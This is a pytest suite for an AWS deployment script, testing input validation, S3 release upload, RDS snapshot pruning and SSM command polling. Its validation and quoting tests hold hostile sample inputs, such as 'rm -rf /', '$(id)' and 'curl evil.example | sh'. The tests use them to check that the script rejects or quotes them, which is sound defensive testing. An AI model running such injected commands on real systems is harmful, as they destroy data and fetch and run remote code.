"""scripts/aws_deploy.py against moto's in-memory AWS, plus fakes for SSM failure paths."""

from __future__ import annotations

import json
import shlex
from collections.abc import Iterator
from datetime import UTC, datetime
from pathlib import Path
from typing import TYPE_CHECKING, Any, Final, cast

import boto3
import pytest
from botocore.exceptions import ClientError
from moto import mock_aws

if TYPE_CHECKING:
    from mypy_boto3_ssm import SSMClient

import aws_deploy
from aws_deploy import (
    Clients,
    DeployConfig,
    DeployError,
    host_commands,
    prune_snapshots,
    run_on_instance,
    snapshot_database,
    upload_release,
    validate_inputs,
)

REGION: Final = "af-south-1"
ENVIRONMENT = "staging"
SHA = "0123456789abcdef0123456789abcdef01234567"
BUCKET = "fintech-analyser-staging-releases-123456789012"
DB_ID = "fintech-analyser-staging"

CONFIG = DeployConfig(
    region=REGION,
    instance_id="i-0123456789abcdef0",
    db_instance_id=DB_ID,
    release_bucket=BUCKET,
    image_registry="123456789012.dkr.ecr.af-south-1.amazonaws.com/fintech-analyser",
    app_parameter_path="/fintech-analyser/staging/app",
    deploy_path="/opt/fintech-analyser",
    predeploy_snapshots_kept=2,
)


@pytest.fixture(autouse=True)
def _fake_credentials(monkeypatch: pytest.MonkeyPatch) -> None:
    for name, value in {
        "AWS_ACCESS_KEY_ID": "testing",
        "AWS_SECRET_ACCESS_KEY": "testing",
        "AWS_SESSION_TOKEN": "testing",
        "AWS_DEFAULT_REGION": REGION,
    }.items():
        monkeypatch.setenv(name, value)


@pytest.fixture()
def clients() -> Iterator[Clients]:
    with mock_aws():
        created = Clients.create(REGION)
        created.s3.create_bucket(
            Bucket=BUCKET, CreateBucketConfiguration={"LocationConstraint": REGION}
        )
        created.rds.create_db_instance(
            DBInstanceIdentifier=DB_ID,
            DBInstanceClass="db.t3.micro",
            Engine="postgres",
            AllocatedStorage=20,
            MasterUsername="fdt",
            MasterUserPassword="not-a-real-password",
        )
        created.ssm.put_parameter(
            Name=DeployConfig.parameter_name(ENVIRONMENT),
            Type="String",
            Value=json.dumps(
                {
                    "region": CONFIG.region,
                    "instance_id": CONFIG.instance_id,
                    "db_instance_id": CONFIG.db_instance_id,
                    "release_bucket": CONFIG.release_bucket,
                    "image_registry": CONFIG.image_registry,
                    "app_parameter_path": CONFIG.app_parameter_path,
                    "deploy_path": CONFIG.deploy_path,
                    "predeploy_snapshots_kept": CONFIG.predeploy_snapshots_kept,
                }
            ),
        )
        yield created


def no_sleep(_: float) -> None:
    return None


# --- input validation ----------------------------------------------------------------------


@pytest.mark.parametrize(
    "image_tag", ["main", "v1.2.0", "ABCDEF1", "abc", "0123abc; rm -rf /", "$(id)"]
)
def test_rejects_anything_but_a_commit_sha(image_tag: str) -> None:
    with pytest.raises(DeployError, match="commit SHA"):
        validate_inputs(ENVIRONMENT, image_tag)


@pytest.mark.parametrize("environment", ["Production", "prod env", "-staging", "x"])
def test_rejects_invalid_environment_names(environment: str) -> None:
    with pytest.raises(DeployError, match="environment"):
        validate_inputs(environment, SHA)


def test_accepts_short_and_full_shas() -> None:
    validate_inputs(ENVIRONMENT, SHA)
    validate_inputs(ENVIRONMENT, SHA[:7])


# --- configuration ---------------------------------------------------------------------------


def test_loads_the_environment_config_terraform_wrote(clients: Clients) -> None:
    assert DeployConfig.load(clients.ssm, ENVIRONMENT) == CONFIG


def test_missing_config_explains_that_terraform_has_not_run(clients: Clients) -> None:
    with pytest.raises(DeployError, match="Has Terraform been applied for production"):
        DeployConfig.load(clients.ssm, "production")


# --- release upload --------------------------------------------------------------------------


def test_uploads_every_release_file_flat_under_the_commit(clients: Clients, tmp_path: Path) -> None:
    for source in aws_deploy.RELEASE_FILES:
        (tmp_path / source).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / source).write_text(f"contents of {source}")

    keys = upload_release(clients.s3, CONFIG, SHA, tmp_path)

    assert sorted(keys) == sorted(
        [
            f"releases/{SHA}/docker-compose.prod.yml",
            f"releases/{SHA}/remote-deploy.sh",
            f"releases/{SHA}/Caddyfile",
        ]
    )
    body = clients.s3.get_object(Bucket=BUCKET, Key=f"releases/{SHA}/Caddyfile")["Body"].read()
    assert body == b"contents of infrastructure/caddy/Caddyfile"


def test_upload_fails_loudly_when_a_release_file_is_missing(
    clients: Clients, tmp_path: Path
) -> None:
    with pytest.raises(DeployError, match="release file missing"):
        upload_release(clients.s3, CONFIG, SHA, tmp_path)


def test_the_real_release_files_exist_in_the_repository() -> None:
    for source in aws_deploy.RELEASE_FILES:
        assert (aws_deploy.REPO_ROOT / source).is_file(), source


# --- database snapshots ----------------------------------------------------------------------


def test_snapshot_is_named_for_the_environment_commit_and_time(clients: Clients) -> None:
    identifier = snapshot_database(
        clients.rds,
        CONFIG,
        ENVIRONMENT,
        SHA,
        now=datetime(2026, 11, 21, 18, 30, 5, tzinfo=UTC),
        wait_delay=1,
    )

    assert identifier == "predeploy-staging-0123456789ab-20261121183005"
    snapshot = clients.rds.describe_db_snapshots(DBSnapshotIdentifier=identifier)["DBSnapshots"][0]
    assert snapshot["DBInstanceIdentifier"] == DB_ID
    tags = clients.rds.list_tags_for_resource(ResourceName=snapshot["DBSnapshotArn"])["TagList"]
    assert {"Key": "ImageTag", "Value": SHA} in tags


def test_pruning_keeps_the_newest_predeploy_snapshots_and_nothing_else_is_touched(
    clients: Clients,
) -> None:
    for name in (
        "predeploy-staging-aaaaaaaaaaaa-20260101000001",
        "predeploy-staging-bbbbbbbbbbbb-20260101000002",
        "predeploy-staging-cccccccccccc-20260101000003",
        "predeploy-production-dddddddddddd-20260101000004",
        "manual-before-big-migration",
    ):
        clients.rds.create_db_snapshot(DBSnapshotIdentifier=name, DBInstanceIdentifier=DB_ID)

    deleted = prune_snapshots(clients.rds, CONFIG, ENVIRONMENT)

    remaining = {
        s["DBSnapshotIdentifier"]
        for s in clients.rds.describe_db_snapshots(DBInstanceIdentifier=DB_ID)["DBSnapshots"]
    }
    assert deleted == ["predeploy-staging-aaaaaaaaaaaa-20260101000001"]
    assert "predeploy-staging-cccccccccccc-20260101000003" in remaining
    assert "predeploy-staging-bbbbbbbbbbbb-20260101000002" in remaining
    assert "predeploy-production-dddddddddddd-20260101000004" in remaining
    assert "manual-before-big-migration" in remaining


# --- host command ----------------------------------------------------------------------------


def test_host_commands_fetch_the_release_and_run_the_deploy_script() -> None:
    commands = host_commands(CONFIG, "deploy", SHA)

    assert commands[0] == "set -eu"
    assert f"aws s3 cp --recursive --only-show-errors s3://{BUCKET}/releases/{SHA}/" in commands[2]
    assert commands[-1] == f"bash remote-deploy.sh deploy {SHA}"
    assert "SSM_PARAMETER_PATH=/fintech-analyser/staging/app" in commands[4]


def test_host_commands_quote_every_interpolated_value() -> None:
    hostile = DeployConfig(
        region="af-south-1",
        instance_id="i-1",
        db_instance_id="db",
        release_bucket="bucket",
        image_registry="registry; curl evil.example | sh",
        app_parameter_path="/p/$(whoami)",
        deploy_path="/opt/with space",
        predeploy_snapshots_kept=1,
    )

    export_line = host_commands(hostile, "deploy", SHA)[4]

    # Splitting the way a shell would yields single assignments, nothing executable.
    words = shlex.split(export_line)
    assert words[0] == "export"
    assert "IMAGE_REGISTRY=registry; curl evil.example | sh" in words
    assert "SSM_PARAMETER_PATH=/p/$(whoami)" in words
    assert host_commands(hostile, "deploy", SHA)[1] == "mkdir -p '/opt/with space'"


# --- end to end against moto -----------------------------------------------------------------


def test_deploy_uploads_snapshots_and_runs_on_the_host(clients: Clients) -> None:
    result = aws_deploy.deploy(clients, ENVIRONMENT, SHA, sleep=no_sleep)

    assert result.succeeded
    sent = clients.ssm.list_commands()["Commands"][0]
    assert sent["DocumentName"] == "AWS-RunShellScript"
    assert sent["InstanceIds"] == [CONFIG.instance_id]
    assert f"bash remote-deploy.sh deploy {SHA}" in sent["Parameters"]["commands"]
    # Manual only: RDS (and moto) also keep an automated `rds:` snapshot of the instance.
    snapshots = clients.rds.describe_db_snapshots(
        DBInstanceIdentifier=DB_ID, SnapshotType="manual"
    )["DBSnapshots"]
    assert [s["DBSnapshotIdentifier"][:31] for s in snapshots] == [
        "predeploy-staging-0123456789ab-"
    ]


def test_deploy_can_skip_the_snapshot(clients: Clients) -> None:
    aws_deploy.deploy(clients, ENVIRONMENT, SHA, skip_snapshot=True, sleep=no_sleep)
    manual = clients.rds.describe_db_snapshots(DBInstanceIdentifier=DB_ID, SnapshotType="manual")
    assert manual["DBSnapshots"] == []


def test_rollback_runs_the_rollback_action_for_the_failed_tag(clients: Clients) -> None:
    result = aws_deploy.rollback(clients, ENVIRONMENT, SHA, sleep=no_sleep)

    assert result.succeeded
    sent = clients.ssm.list_commands()["Commands"][0]
    assert f"bash remote-deploy.sh rollback {SHA}" in sent["Parameters"]["commands"]


def test_main_rejects_a_bad_tag_before_calling_aws(capsys: pytest.CaptureFixture[str]) -> None:
    assert aws_deploy.main(["deploy", "--environment", "staging", "--image-tag", "main"]) == 1
    assert "commit SHA" in capsys.readouterr().err


# --- SSM polling, with a fake client for states moto never produces --------------------------


class FakeSSM:
    """Just enough of the SSM client for run_on_instance; `as_client` gives it that type."""

    def __init__(self, statuses: list[str | Exception]) -> None:
        self._statuses = statuses
        self.polls = 0

    def send_command(self, **_: Any) -> dict[str, Any]:
        return {"Command": {"CommandId": "cmd-1"}}

    def get_command_invocation(self, **_: Any) -> dict[str, Any]:
        status = self._statuses[min(self.polls, len(self._statuses) - 1)]
        self.polls += 1
        if isinstance(status, Exception):
            raise status
        return {
            "Status": status,
            "StandardOutputContent": "migrating...\n",
            "StandardErrorContent": "boom" if status == "Failed" else "",
        }

    def as_client(self) -> SSMClient:
        return cast("SSMClient", self)


def _not_yet() -> ClientError:
    return ClientError(
        {"Error": {"Code": "InvocationDoesNotExist", "Message": "not yet"}},
        "GetCommandInvocation",
    )


def test_polling_tolerates_the_invocation_not_existing_yet_then_reports_failure() -> None:
    ssm = FakeSSM([_not_yet(), "Pending", "InProgress", "Failed"])

    result = run_on_instance(ssm.as_client(), CONFIG, ["true"], comment="t", sleep=no_sleep)

    assert result.status == "Failed"
    assert not result.succeeded
    assert result.stderr == "boom"
    assert ssm.polls == 4


def test_polling_gives_up_after_the_timeout() -> None:
    ssm = FakeSSM(["InProgress"])
    ticks = iter(range(0, 100_000, 60))

    with pytest.raises(DeployError, match="did not finish"):
        run_on_instance(
            ssm.as_client(),
            CONFIG,
            ["true"],
            comment="t",
            timeout_seconds=300,
            sleep=no_sleep,
            clock=lambda: float(next(ticks)),
        )


def test_polling_reraises_unexpected_errors() -> None:
    denied = ClientError(
        {"Error": {"Code": "AccessDeniedException", "Message": "no"}}, "GetCommandInvocation"
    )
    with pytest.raises(ClientError):
        run_on_instance(
            FakeSSM([denied]).as_client(), CONFIG, ["true"], comment="t", sleep=no_sleep
        )


def test_boto3_is_importable_for_type_checkers() -> None:
    assert boto3.__version__
